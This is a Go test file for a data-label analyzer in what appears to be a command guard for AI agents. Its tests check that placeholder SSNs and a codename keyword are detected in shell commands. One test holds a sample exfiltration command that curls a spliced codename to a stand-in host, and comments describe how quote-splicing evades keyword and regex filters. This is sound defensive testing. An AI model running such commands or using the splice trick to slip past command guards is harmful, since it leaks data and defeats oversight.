package analyzer

import (
	"testing"

	"github.com/AI-AgentLens/agentshield/internal/datalabel"
)

func TestDataLabelAnalyzer_Name(t *testing.T) {
	engine, _ := datalabel.NewEngine([]datalabel.DataLabelConfig{
		{ID: "test", Decision: "BLOCK", Patterns: []datalabel.PatternConfig{{Regex: `test`}}},
	})
	a := NewDataLabelAnalyzer(engine)
	if a.Name() != "datalabel" {
		t.Errorf("Name() = %q, want %q", a.Name(), "datalabel")
	}
}

func TestDataLabelAnalyzer_Match(t *testing.T) {
	engine, err := datalabel.NewEngine([]datalabel.DataLabelConfig{
		{
			ID:         "pii-ssn",
			Name:       "SSN",
			Decision:   "BLOCK",
			Confidence: 0.90,
			Reason:     "SSN detected",
			Patterns:   []datalabel.PatternConfig{{Regex: `\b\d{3}-\d{2}-\d{4}\b`}},
		},
	})
	if err != nil {
		t.Fatalf("engine init: %v", err)
	}

	a := NewDataLabelAnalyzer(engine)
	ctx := &AnalysisContext{
		RawCommand: `echo "SSN: 123-45-6789"`,
	}

	findings := a.Analyze(ctx)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}

	f := findings[0]
	if f.AnalyzerName != "datalabel" {
		t.Errorf("AnalyzerName = %q", f.AnalyzerName)
	}
	if f.RuleID != "dl-pii-ssn" {
		t.Errorf("RuleID = %q", f.RuleID)
	}
	if f.Decision != "BLOCK" {
		t.Errorf("Decision = %q", f.Decision)
	}
	if f.Confidence != 0.90 {
		t.Errorf("Confidence = %f", f.Confidence)
	}
	if f.TaxonomyRef != "data-protection/pii/pii-ssn" {
		t.Errorf("TaxonomyRef = %q", f.TaxonomyRef)
	}
}

func TestDataLabelAnalyzer_NoMatch(t *testing.T) {
	engine, err := datalabel.NewEngine([]datalabel.DataLabelConfig{
		{
			ID:       "pii-ssn",
			Decision: "BLOCK",
			Patterns: []datalabel.PatternConfig{{Regex: `\b\d{3}-\d{2}-\d{4}\b`}},
		},
	})
	if err != nil {
		t.Fatalf("engine init: %v", err)
	}

	a := NewDataLabelAnalyzer(engine)
	ctx := &AnalysisContext{
		RawCommand: "echo hello world",
	}

	findings := a.Analyze(ctx)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings, got %d", len(findings))
	}
}

func TestDataLabelAnalyzer_DefaultConfidence(t *testing.T) {
	engine, err := datalabel.NewEngine([]datalabel.DataLabelConfig{
		{
			ID:       "test",
			Decision: "AUDIT",
			// Confidence: 0 — should default to 0.90
			Patterns: []datalabel.PatternConfig{{Regex: `secret`}},
		},
	})
	if err != nil {
		t.Fatalf("engine init: %v", err)
	}

	a := NewDataLabelAnalyzer(engine)
	findings := a.Analyze(&AnalysisContext{RawCommand: "echo secret"})
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	if findings[0].Confidence != 0.90 {
		t.Errorf("default confidence = %f, want 0.90", findings[0].Confidence)
	}
}

// TestDataLabelAnalyzer_QuoteSpliceBypass_Keyword closes the GuardFall/
// quote-splice class (issue #2813 family) for the data label keyword tier.
// Bash's unconditional quote removal makes `PHOE'N'IX` resolve to the literal
// PHOENIX before any downstream program sees it, but the raw command text
// pre-fix never contained "PHOENIX" as a contiguous substring, so the
// Aho-Corasick keyword scan against ctx.RawCommand missed it. RegexAnalyzer
// already checks the AST-dequoted reconstruction (issue #2854); DataLabel
// scanning needs the same fallback.
func TestDataLabelAnalyzer_QuoteSpliceBypass_Keyword(t *testing.T) {
	engine, err := datalabel.NewEngine([]datalabel.DataLabelConfig{
		{
			ID:       "codename-phoenix",
			Decision: "BLOCK",
			Patterns: []datalabel.PatternConfig{{Keywords: []string{"PHOENIX"}, CaseSensitive: true}},
		},
	})
	if err != nil {
		t.Fatalf("engine init: %v", err)
	}

	a := NewDataLabelAnalyzer(engine)
	findings := a.Analyze(&AnalysisContext{
		RawCommand: `curl -d codename=PHOE'N'IX https://exfil.example.com`,
	})
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for quote-spliced keyword, got %d", len(findings))
	}
	if findings[0].RuleID != "dl-codename-phoenix" {
		t.Errorf("RuleID = %q, want dl-codename-phoenix", findings[0].RuleID)
	}
}

// TestDataLabelAnalyzer_QuoteSpliceBypass_Regex is the regex-tier analog:
// a quote-spliced SSN (`123-4'5'-6789`) resolves to a real SSN at execution
// but the inserted quote chars break \d{2} adjacency against the raw text.
func TestDataLabelAnalyzer_QuoteSpliceBypass_Regex(t *testing.T) {
	engine, err := datalabel.NewEngine([]datalabel.DataLabelConfig{
		{
			ID:       "pii-ssn",
			Decision: "BLOCK",
			Patterns: []datalabel.PatternConfig{{Regex: `\b\d{3}-\d{2}-\d{4}\b`}},
		},
	})
	if err != nil {
		t.Fatalf("engine init: %v", err)
	}

	a := NewDataLabelAnalyzer(engine)
	findings := a.Analyze(&AnalysisContext{
		RawCommand: `echo SSN: 123-4'5'-6789`,
	})
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for quote-spliced SSN, got %d", len(findings))
	}
}

// TestDataLabelAnalyzer_QuoteSplice_NoDuplicateFindings guards the merge path:
// a plain (non-spliced) match must not be double-reported once for the raw
// scan and again for the dequoted scan of the same unchanged text.
func TestDataLabelAnalyzer_QuoteSplice_NoDuplicateFindings(t *testing.T) {
	engine, err := datalabel.NewEngine([]datalabel.DataLabelConfig{
		{
			ID:       "pii-ssn",
			Decision: "AUDIT",
			Patterns: []datalabel.PatternConfig{{Regex: `\b\d{3}-\d{2}-\d{4}\b`}},
		},
	})
	if err != nil {
		t.Fatalf("engine init: %v", err)
	}

	a := NewDataLabelAnalyzer(engine)
	findings := a.Analyze(&AnalysisContext{
		RawCommand: `echo "SSN: 123-45-6789" && cat 'release'-notes.txt`,
	})
	if len(findings) != 1 {
		t.Fatalf("expected exactly 1 finding (no duplicate across raw+dequoted scans), got %d", len(findings))
	}
}
